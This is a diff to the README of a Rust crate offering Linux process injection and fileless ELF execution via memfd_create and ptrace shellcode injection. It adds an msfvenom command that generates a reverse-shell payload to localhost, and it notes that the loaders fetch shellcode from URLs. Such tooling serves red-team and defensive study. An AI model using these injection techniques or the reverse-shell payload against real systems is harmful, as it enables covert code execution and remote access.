@@ -1,25 +1,42 @@
 # libinject-linux
 
-`libinject-linux` is a Rust crate containing implementations for process injection techniques on Linux.
+`libinject-linux` is a Rust crate containing implementations for process injection and fileless ELF execution techniques on Linux.
 
 ## Functionality
-The following process injection techniques are currently implemented:
-- Using [memfd_create(2)](https://man7.org/linux/man-pages/man2/memfd_create.2.html) to create an anonymous file that lives in memory, write an ELF to it, and then execute.
+The following techniques are currently implemented:
+- Using [memfd_create(2)](https://man7.org/linux/man-pages/man2/memfd_create.2.html) to create an anonymous file in memory, write an ELF to it, and then execute.
+- Using [ptrace(2)](https://man7.org/linux/man-pages/man2/ptrace.2.html) to overwrite the RIP register of a forked process with shellcode.
 
 ## Usage
+### Library
 Add `libinject-linux` as a dependency to your Rust project
 ```bash
 cargo add --git https://github.com/dustyw0lf/libinject-linux.git
 ```
 
-or try out the code by building one of the examples
+### Library examples
+>[!note]
+>The functions can take binaries or shellcode from either URLs or filesystem paths.
+
+Clone the repo
 ```bash
 git clone https://github.com/dustyw0lf/libinject-linux.git
 ```
 
+Run the `memfd` example
 ```bash
-cargo run --example anon_file
+cargo run --example memfd
 ```
 
-## Acknowledgments
-The `memfd_create(2)` implementation is based on an article by [@magisterquis](https://x.com/magisterquis): [In-Memory-Only ELF Execution (Without tmpfs)](https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html).
+To run the `hollow` example, first `cd libinject-linux/libinject/examples` and then
+```bash
+cargo run --example hollow
+```
+
+The example shellcode was generated using the following command
+```bash
+msfvenom --payload 'linux/x64/shell_reverse_tcp' LHOST=127.0.0.1 LPORT=1234 --format 'raw' --platform 'linux' --arch 'x64' --out shellcode.bin
+```
+
+### Standalone Binary
+TODO: Write docs for standalone binary.
